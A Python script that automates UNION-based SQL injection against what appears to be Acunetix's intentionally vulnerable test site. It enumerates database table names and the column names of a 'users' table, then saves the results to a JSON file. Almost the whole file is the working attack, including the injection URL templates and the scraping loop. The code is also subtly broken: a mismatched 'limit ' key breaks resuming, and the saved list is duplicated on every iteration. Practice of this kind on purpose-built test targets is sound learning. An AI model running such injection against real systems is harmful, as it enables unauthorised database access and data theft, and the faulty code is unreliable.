import requests
from bs4 import BeautifulSoup
import json
import time
import os
# table_name
# url_target = "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,table_name  from information_schema.tables limit {0},1"
# total_index = 86
# colom pada table users
url_target= "http://testphp.vulnweb.com/artists.php?artist=0 union select 1,2,column_name from information_schema.columns where table_name=\"users\" limit {0},1"
total_index = 7
file_report = "data_acunetic_table_user.json"


def load_existing_file():
    if os.path.exists(file_report):
        with open(file_report,"r") as file:
            existing_data = json.load(file)
            last_limit = existing_data[-1]['limit'] + 1 if existing_data else 0
            return existing_data, last_limit
    return [],0

def fetch_table_name(limit):
    retries = 0
    while retries < 3 :
        url = url_target.format(limit)
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Request failed (Status {response.status_code}) fir kuntu {limit}. Retrying ....")
            
        if 'html' not in response.headers.get('Content-Type',''):
            print(f"Invalid response type for limit {limit}")
        else:
            soup = BeautifulSoup(response.content,'html.parser')
            table_name_div = soup.find('div',class_="story")
            if table_name_div:
                table_name = table_name_div.get_text(strip=True)
                table_name = table_name.replace("view pictures of the artist","").replace("comment on this artist","").strip()
                print(f"Table name for limit {limit} : {table_name}")
                return {"limit " : limit , "table_name " : table_name}
            else:
                print(f"Tabel name not found for limit {limit}. Retrying")
        retries +=1
        time.sleep(2)
    print(f"Failed to fetch data for limit {limit} after 3 retries.")
    return None

def save_data(data):
    with open(file_report,"w") as file:
        json.dump(data,file,indent=4)

def main():
    existing_file, last_limit = load_existing_file()
    new_data = []
    
    for limit in range(last_limit,total_index):
        result = fetch_table_name(limit)
        if result:
            new_data.append(result)
        
        if new_data:
            existing_file.extend(new_data)
            save_data(existing_file)
            print(f"Scraping completed. Total items collected : {len(existing_file)}")


if __name__ == "__main__":
    main()